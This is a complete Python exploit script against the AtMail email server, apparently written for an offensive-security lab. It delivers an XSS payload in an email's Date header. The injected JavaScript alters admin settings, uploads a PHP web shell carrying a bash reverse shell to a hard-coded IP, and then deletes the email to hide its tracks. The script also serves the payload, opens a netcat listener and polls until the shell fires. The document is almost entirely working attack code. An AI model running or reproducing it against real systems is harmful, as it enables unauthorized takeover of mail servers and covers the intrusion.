import smtplib, argparse, threading, subprocess, sys, requests, re, os
from time import sleep
from http.server import HTTPServer, SimpleHTTPRequestHandler


def sendMail(destination_email, from_email, smtp_server_ip, attacker_ip):
    payload = f'<script src="http://{attacker_ip}/atmail-payload.js"></script>'
    msg  = f"From: {from_email}\n"
    msg += f"To: {destination_email}\n"
    msg += f"Date: {payload}\n"
    msg += "Subject: Definitely Not a Malicious Email\n"
    msg += "Content-type: text/html\n\n"
    msg += "rs0n wuz here"
    msg += '\r\n\r\n'
    server = smtplib.SMTP(smtp_server_ip)
    try:
        server.sendmail(from_email, destination_email, msg)
        print("[+] Payload Delivered Successfully!")
    except Exception as e:
        print("[-] Failed to send email:")
        print("[*] " + str(e))
    server.quit()

def load_payload(js_payload_oneline):
    f = open('/tmp/atmail-payload.js', 'w')
    f.write(js_payload_oneline)
    f.close()

def run_server(attacker_ip):
    try:
        os.chdir("/tmp")
        httpd = HTTPServer((attacker_ip, 80), SimpleHTTPRequestHandler)
        httpd.serve_forever()
    except Exception as e:
        print(f"[!] ERROR: {e}")
        print("[!] Python server failed!  Exiting...")
        sys.exit(-1)

def run_listener(port):
    try:
        subprocess.run(["nc -lnvp 4444"], shell=True)
    except Exception as e:
        print(f"[!] ERROR: {e}")
        print("[!] Netcat listener failed!  Exiting...")
        sys.exit(-1)

def trigger_payload(target_email, url):
    sleep(5)
    simple_email = ""
    for letter in target_email:
        if re.match("[a-zA-Z0-9]", letter):
            simple_email += letter
    trigger = requests.get(f"{url}/{simple_email[0]}/{simple_email[1]}/{simple_email}/--final-shell.php")
    if trigger.status_code != 404:
        return True
    else:
        return False

def wait_for_rev_shell(time_between_req):
    while True:
        sleep(time_between_req)
        trigger = trigger_payload(args.dstemail, args.url)
        if trigger == True:
            break


def arg_parse():
    parser = argparse.ArgumentParser()
    parser.add_argument('-t','--targetip', help='IP Address of ATMail Server', required=True)
    parser.add_argument('-a','--attackerip', help='IP Address of Attacker Machine', required=True)
    parser.add_argument('-u', '--url', help='URL of ATMail Homepage (http://atmail.com)', required=True)
    parser.add_argument('-d','--dstemail', help='Email Address of Target', required=True)
    parser.add_argument('-f','--frmemail', help='Email Address of Attacker', required=True)
    return parser.parse_args()

def main(args):
    print(f"[+] ATMail Email Server -- XSS + CSRF -> RCE through File Upload via Email Attachment")
    print("[+] Building Payload...")
    js_payload = r'''fetch("''' + args.url + r'''/index.php/admin/settings/globalsave",{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded","Content-Length":"864",Connection:"close"},credentials:"include",body:"save=1&fields%5Badmin_email%5D=admin%40offsec.local&fields%5Bsession_timeout%5D=121&fields%5Bsql_host%5D=127.0.0.1&fields%5Bsql_user%5D=root&fields%5Bsql_pass%5D=956ec84a45e0675851367c7e480ec0e9&fields%5Bsql_table%5D=atmail6&dovecot%5BauthType%5D=sql&dovecot%5BldapType%5D=openldap&dovecot%5Bldap_bindauth%5D=1&dovecot%5Bldap_host%5D=&dovecot%5Bldap_binddn%5D=&dovecot%5Bldap_bindpass%5D=&dovecot%5Bldap_basedn%5D=&dovecot%5Bldap_passwdfield%5D=&dovecot%5Bldap_passfilter%5D=&dovecot%5Bldap_bindauth%5D=1&dovecot%5Bldap_bindauthdn%5D=cn%3D%25u%2Cdc%3Ddomain%2Cdc%3Dorg&userPasswordEncryptionTypeCurrent=PLAIN&fields%5BuserPasswordEncryptionType%5D=PLAIN&externalUserPasswordEncryptionTypeCurrent=PLAIN&fields%5BexternalUserPasswordEncryptionType%5D=PLAIN&fields%5Bmaster_key%5D=&fields%5Blog_purge_days%5D=180&fields%5Bdebug%5D=0&fields%5BtmpFolderBaseName%5D="}).then(e=>{fetch("''' + args.url + r'''/index.php/mail/composemessage/addattachment/composeID/",{method:"POST",headers:{"Content-Type":"multipart/form-data; boundary=---------------------------44683987216108895621510887509","Content-Length":"298",Connection:"close"},credentials:"include",body:'-----------------------------44683987216108895621510887509\r\nContent-Disposition: form-data; name="newAttachment"; filename="final-shell.php"\r\nContent-Type:\r\n\r\n<?php\n\texec("/bin/bash -c \'bash -i >& /dev/tcp/192.168.119.132/4444 0>&1\'");\n?>\n\r\n-----------------------------44683987216108895621510887509--\r\n'}).then(e=>{let t=document.getElementsByClassName("mail_row");for(i=0;i<t.length;i++){let e=document.getElementById(t[i].id);e.innerText.includes("rs0n wuz here")&&fetch("''' + args.url + r'''/index.php/mail/mail/movetofolder/fromFolder/INBOX/toFolder/INBOX.Trash",{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded",Accept:"application/json, text/javascript, */*"},body:"resultContext=messageList&listFolder=INBOX&pageNumber=1&mailId%5B%5D="+e.id+"&unseen%5B5%5D=0"}).then(e=>{fetch("''' + args.url + r'''/index.php/mail/mail/emptyfolder/folder/INBOX.Trash/contextId/%23messageList").then(e=>window.location="''' + args.url + r'''/index.php")})}})});'''
    load_payload(js_payload)
    print("[+] Hosting Payload on HTTP Server...")
    server_thread = threading.Thread(target=run_server, args=(args.attackerip,))
    server_thread.start()
    print("[+] Starting Netcat Listener...")
    listener_thread = threading.Thread(target=run_listener, args=("4444",))
    listener_thread.start()
    sleep(.5)
    print("[-] Sending Malicous Email...")
    sendMail(args.dstemail, args.frmemail, args.targetip, args.attackerip)
    print("[-] And now we wait.......")
    wait_for_rev_shell(30)

if __name__ == "__main__":
    args = arg_parse()
    main(args)